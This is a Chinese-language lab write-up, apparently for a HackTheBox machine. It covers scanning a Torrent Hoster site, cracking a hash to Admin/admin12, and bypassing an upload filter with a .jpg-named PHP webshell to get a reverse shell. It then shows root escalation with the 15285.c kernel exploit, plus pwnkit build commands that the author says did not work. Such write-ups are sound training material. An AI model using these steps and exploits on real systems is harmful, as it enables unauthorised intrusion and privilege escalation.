## nmap

```Bash
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 5.1p1 Debian 6ubuntu2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   1024 3e:c8:1b:15:21:15:50:ec:6e:63:bc:c5:6b:80:7b:38 (DSA)
|_  2048 aa:1f:79:21:b8:42:f4:8a:38:bd:b8:05:ef:1a:07:4d (RSA)
80/tcp open  http    Apache httpd 2.2.12 ((Ubuntu))
|_http-title: Site doesn't have a title (text/html).
|_http-server-header: Apache/2.2.12 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

```



## HTTP

目录扫描

```Bash
/index.html           (Status: 200) [Size: 177]
/index                (Status: 200) [Size: 177]
/test                 (Status: 200) [Size: 47034]
/test.php             (Status: 200) [Size: 47046]
/torrent              (Status: 301) [Size: 310] [--> http://10.10.10.6/torrent/]
/rename               (Status: 301) [Size: 309] [--> http://10.10.10.6/rename/]

```

test页面展示phpinfo()

torrent目录扫描

```Bash
/login.php            (Status: 200) [Size: 8367]
/login                (Status: 200) [Size: 8371]
/templates            (Status: 301) [Size: 320] [--> http://10.10.10.6/torrent/templates/]
/index                (Status: 200) [Size: 11356]
/index.php            (Status: 200) [Size: 11356]
/images               (Status: 301) [Size: 317] [--> http://10.10.10.6/torrent/images/]
/download             (Status: 200) [Size: 0]
/download.php         (Status: 200) [Size: 0]
/rss                  (Status: 200) [Size: 964]
/rss.php              (Status: 200) [Size: 964]
/users                (Status: 301) [Size: 316] [--> http://10.10.10.6/torrent/users/]
/admin                (Status: 301) [Size: 316] [--> http://10.10.10.6/torrent/admin/]
/health               (Status: 301) [Size: 317] [--> http://10.10.10.6/torrent/health/]
/browse               (Status: 200) [Size: 9278]
/browse.php           (Status: 200) [Size: 9278]
/comment              (Status: 200) [Size: 936]
/upload               (Status: 301) [Size: 317] [--> http://10.10.10.6/torrent/upload/]
/comment.php          (Status: 200) [Size: 936]
/upload.php           (Status: 200) [Size: 8357]
/css                  (Status: 301) [Size: 314] [--> http://10.10.10.6/torrent/css/]
/edit                 (Status: 200) [Size: 0]
/edit.php             (Status: 200) [Size: 0]
/lib                  (Status: 301) [Size: 314] [--> http://10.10.10.6/torrent/lib/]
/database             (Status: 301) [Size: 319] [--> http://10.10.10.6/torrent/database/]
/secure.php           (Status: 200) [Size: 4]
/secure               (Status: 200) [Size: 4]
/readme               (Status: 301) [Size: 317] [--> http://10.10.10.6/torrent/readme/]
/js                   (Status: 301) [Size: 313] [--> http://10.10.10.6/torrent/js/]
/logout               (Status: 200) [Size: 182]
/logout.php           (Status: 200) [Size: 182]
/config               (Status: 200) [Size: 0]
/preview              (Status: 200) [Size: 28104]
/config.php           (Status: 200) [Size: 0]
/thumbnail            (Status: 200) [Size: 1789]
/thumbnail.php        (Status: 200) [Size: 1789]
/torrents             (Status: 301) [Size: 319] [--> http://10.10.10.6/torrent/torrents/]
/torrents.php         (Status: 200) [Size: 6477]
/validator            (Status: 200) [Size: 0]
/validator.php        (Status: 200) [Size: 0]
/hide                 (Status: 200) [Size: 3765]

```

大部分页面会重定向到login页面, 组件为 torrent hoster

![](https://secure2.wostatic.cn/static/avHXyEQ2QjHFSCmmWYkkmb/image.png?auth_key=1677500631-3hJbDMQFzNp1ghtQbjaG6W-0-192d9f361d8fd6672e18d7c9125d8094)



在/database 目录中得到一些数据库信息

![](https://secure2.wostatic.cn/static/g2t6DHsHLXWcTNNLx6faWY/image.png?auth_key=1677500631-q73q98KKoAMjpKxS6DMnBq-0-dc0abbb9771d91de525243ca1e1830ef)

有一个新建用户的，可以破解hash得到 Admin/admin12

![](https://secure2.wostatic.cn/static/91PkEdqvuECV5y2FtKHe1e/image.png?auth_key=1677500631-uZ3pVCL9sLyXteMqk3nCAb-0-fc50848777063b4cf6abe548d0f96593)

![](https://secure2.wostatic.cn/static/eXzm2fMGapfqXMn8hJ1xjC/image.png?auth_key=1677500631-wQg3i9DpSpNRrArihon7KV-0-6d21ebac8266dc7acb607c5f50970547)

实际在readme里面也有用户信息，但是这个用户无法进入login页面

![](https://secure2.wostatic.cn/static/2V5K37gBzjmfcW7zZBDfkR/image.png?auth_key=1677500631-f9mbFcRaRxn2M7YKB2ftpW-0-594581e3c7fc84329adbee6f2fb339f6)



rename目录

可以重命名文件，还不确定要怎么使用

![](https://secure2.wostatic.cn/static/k98pEr4FVkHaY8ZJviwyTw/image.png?auth_key=1677500631-cPzkdNbKfmG2w1fgT6vGXV-0-e66b37878ba6285f319477743c00a99a)



看了下题解，上面的torrent hoster的账号是可以自己注册的，里面虽然要求了邮件地址，但是没有要求真实验真，直接注册后可以进入控制面板



只有一个torrent Hoster的文件上传漏洞

上传一个torrent文件

![](https://secure2.wostatic.cn/static/wssAenSRDREWrHNXhsLYr5/image.png?auth_key=1677500631-uWzCaYvxpqD3d1HjVMWvrk-0-17459e3bc50cf54dc8d248584fff26b1)



上传成功后，在edit界面，可以上传一个图片，上传一个php木马，后缀为jpg绕过前端

![](https://secure2.wostatic.cn/static/tUMSvP6CcX4h4vrzbaBS3J/image.png?auth_key=1677500631-9iQtnKQydbaWn7cAzvZpKc-0-d598d6ba40c8bad92089bf5ca4d6c6ac)

burp抓包，修改后缀，上传成功

![](https://secure2.wostatic.cn/static/3c5TssBGaAYf52n8DojZah/image.png?auth_key=1677500631-2r44iXnuUSUMRxVPRX89RD-0-c3a3d76b58ebda87b13545fb69033bae)

访问后，拿到反弹shell和user.txt

![](https://secure2.wostatic.cn/static/48RjP1tgmTKn8ZG5kooFdo/image.png?auth_key=1677500631-qXzycUn4JM84Ywhk5k6Lng-0-8dec638ac295526729842f95acd4d7cf)



## privilege escalation

这个题提权很单一，基本就是暴力方法

george用户下有个zip目录，看了下都是torrent hoster相关文件，没有发现别的特殊文件，考虑系统老旧，直接尝试内核提权

### 内核提权

![](https://secure2.wostatic.cn/static/e8kJ7hGGMzbGRvPfYtTvJN/image.png?auth_key=1677500631-tQGGCFtZLigyEPsvztqgYM-0-d8c616120ab511ed68b242f59849e7fb)

没有找到合适的ubuntu版本的poc

没有匹配的内核版本

这里对内核提权的poc版本限制没有组件那么死板，比如这里用15285.c也是可以成功的

```Bash
$ ./15285
[*] Linux kernel >= 2.6.30 RDS socket exploit
[*] by Dan Rosenberg
[*] Resolving kernel addresses...
 [+] Resolved security_ops to 0xc089b908
 [+] Resolved default_security_ops to 0xc075e2a0
 [+] Resolved cap_ptrace_traceme to 0xc02caf30
 [+] Resolved commit_creds to 0xc01645d0
 [+] Resolved prepare_kernel_cred to 0xc01647d0
[*] Overwriting security ops...
[*] Overwriting function pointer...
[*] Triggering payload...
[*] Restoring function pointer...
[*] Got root!
#
#
# id
uid=0(root) gid=0(root)

```



### pkexec 

没有生效

```Bash
cc -Wall --shared -fPIC -o pwnkit.so pwnkit.c
cc -Wall    cve-2021-4034.c   -o cve-2021-4034
echo "module UTF-8// PWNKIT// pwnkit 1" > gconv-modules
mkdir -p GCONV_PATH=.
cp -f /bin/true GCONV_PATH=./pwnkit.so:.
$ ls
GCONV_PATH=.  README.md        cve-2021-4034.sh  pwnkit.c
LICENSE       cve-2021-4034    dry-run           pwnkit.so
Makefile      cve-2021-4034.c  gconv-modules
$ ./cve-2021-4034
$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)

```



### LinEnum.sh

没有发现特别的，需要确认是否有通过组件提权的解法
